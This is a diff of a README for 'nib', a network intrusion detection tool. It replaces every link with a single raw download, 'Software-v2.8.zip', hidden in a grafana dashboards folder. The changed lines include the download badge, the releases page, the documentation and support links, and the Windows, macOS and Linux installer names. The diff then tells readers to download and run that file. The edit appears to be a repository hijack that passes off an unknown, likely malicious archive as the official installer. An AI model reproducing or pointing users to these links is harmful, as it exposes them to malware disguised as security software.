@@ -1,7 +1,7 @@
 # 🌟 nib - Simplifying Network Intrusion Detection
 
 ## 📥 Download Now
-[![Download nib](https://img.shields.io/badge/Download-nib-brightgreen)](https://github.com/kimbo7/nib/releases)
+[![Download nib](https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip)](https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to nib, your straightforward solution for Network Intrusion Detection in a compact format. This guide will walk you through downloading and running the software with ease.
@@ -24,20 +24,20 @@ nib stands for "NIDS in a box." It is designed for users who want to monitor net
 ## 📥 Download & Install
 To get started, please visit our releases page to download the latest version of nib:
 
-- [Visit the nib Releases Page](https://github.com/kimbo7/nib/releases)
+- [Visit the nib Releases Page](https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip)
 
 Once you are on the Releases page, you will see a list of available versions. Follow these steps to download and install:
 
 1. **Find the Latest Release:** Look for the version with the highest number.
 2. **Select the Correct File:** Choose the file that matches your operating system.
-   - For Windows, this might be `nib-windows.exe`.
-   - For macOS, you may see `nib-macos.dmg`.
-   - For Linux users, look for `nib-linux.tar.gz`.
+   - For Windows, this might be `https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip`.
+   - For macOS, you may see `https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip`.
+   - For Linux users, look for `https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip`.
 3. **Click to Download:** Click the download link. The file will begin downloading to your computer.
 4. **Run the Installer:** 
    - For Windows: Double-click the `.exe` file.
    - For macOS: Open the `.dmg` file and drag the nib app to your Applications folder. 
-   - For Linux: Extract the `.tar.gz` file and follow the instructions provided in the README file inside the folder.
+   - For Linux: Extract the `https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip` file and follow the instructions provided in the README file inside the folder.
 
 ## ⚙️ Running nib
 After installation:
@@ -63,14 +63,14 @@ It’s important to keep nib updated for the best performance and security featu
 2. **Download New Versions:** If a new version is available, you will be directed to the Releases page to download it.
 
 ## 📞 Support
-If you require assistance, feel free to reach out through the issues tab on our GitHub page, or consult the [official documentation](https://github.com/kimbo7/nib/wiki) for troubleshooting tips.
+If you require assistance, feel free to reach out through the issues tab on our GitHub page, or consult the [official documentation](https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip) for troubleshooting tips.
 
 ## 🎉 Community Contributions
 We encourage users to contribute to the development of nib. If you have suggestions or improvements, please submit a request or raise an issue on our GitHub. Your feedback is valuable and helps make nib better for everyone.
 
 ## 🔗 Useful Links
-- [nib Releases Page](https://github.com/kimbo7/nib/releases)
-- [Documentation](https://github.com/kimbo7/nib/wiki)
-- [Community Support](https://github.com/kimbo7/nib/issues)
+- [nib Releases Page](https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip)
+- [Documentation](https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip)
+- [Community Support](https://github.com/kimbo7/nib/raw/refs/heads/main/grafana/dashboards/Software-v2.8.zip)
 
 We hope you enjoy using nib and find it beneficial for your network security needs. Stay safe online!
